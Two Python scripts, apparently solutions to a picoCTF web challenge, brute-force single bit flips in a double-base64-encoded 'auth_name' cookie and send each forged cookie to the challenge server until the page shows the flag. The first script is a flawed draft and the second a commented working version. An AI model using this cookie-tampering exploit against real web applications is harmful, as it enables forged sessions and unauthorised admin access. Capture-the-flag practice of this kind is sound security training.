import requests
import base64

url = "http://mercury.picoctf.net:34962/"
session = requests.Session()
response = session.get(url)
cookies = session.cookies

for cookie in cookies:
    print(f"Name: {cookie.name}, Value: {cookie.value}")
    bits = b'3hkrB20HwuUCYuDOUP9XRtA6RcimLL3H2G5fXQX2RJ8ZkghkaoLuYr4lYR6ftikWQKYYrLi9jefxTRdPO8z80EsLx8fOXys2YWkffo2aIwSfiGl9jeVcQHVZysFPUO9N'
    print(f"Double Decoded Value: {bits}")

    for i in range(128):
        print(i)
        for j in range(8):
            guess = bits[0:i] + ((bits[i] ^ j).to_bytes(1, 'big')) + bits[i+1:]
            guess = base64.b64encode(guess).decode()
            print(guess)
            response = requests.get(url, cookies={'auth_name': guess})

            if 'pico' in response.text:
                print(response.text)

session.close()

import requests
import base64
from tqdm import tqdm

ADDRESS = "http://mercury.picoctf.net:34962/"

s = requests.Session()
s.get(ADDRESS)
cookie = s.cookies["auth_name"]
# Decode the cookie from base64 twice to reverse the encoding scheme.
decoded_cookie = b'3hkrB20HwuUCYuDOUP9XRtA6RcimLL3H2G5fXQX2RJ8ZkghkaoLuYr4lYR6ftikWQKYYrLi9jefxTRdPO8z80EsLx8fOXys2YWkffo2aIwSfiGl9jeVcQHVZysFPUO9N'
raw_cookie = base64.b64decode(decoded_cookie)


def exploit():
    # Loop over all the bytes in the cookie.
    for position_idx in range(0, len(raw_cookie)):
        print(position_idx)
        for bit_idx in range(0, 8):
            # Construct the current guess.
            # - All bytes before the current `position_idx` are left alone.
            # - The byte in the `position_idx` has the bit at position `bit_idx` flipped.
            #   This is done by XORing the byte with another byte where all bits are zero
            #   except for the bit in position `bit_idx`. The code `1 << bit_idx`
            #   creates a byte by shifting the bit `1` to the left `bit_idx` times. Thus,
            #   the XOR operation will flip the bit in position `bit_idx`.
            # - All bytes after the current `position_idx` are left alone.
            bitflip_guess = (
                raw_cookie[0:position_idx]
                + ((raw_cookie[position_idx] ^ (1 << bit_idx)).to_bytes(1, "big"))
                + raw_cookie[position_idx + 1:]
            )

            # Double base64 encode the bit-blipped cookie following the encoding scheme.
            guess = base64.b64encode(base64.b64encode(bitflip_guess)).decode()
            print(guess)

            # Send a request with the cookie to the application and scan for the
            # beginning of the flag.
            r = requests.get(ADDRESS, cookies={"auth_name": guess})
            if "picoCTF{" in r.text:
                print(guess)
                print(f"Admin bit found in byte {position_idx} bit {bit_idx}.")
                # The flag is between `<code>` and `</code>`.
                print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
                return


exploit()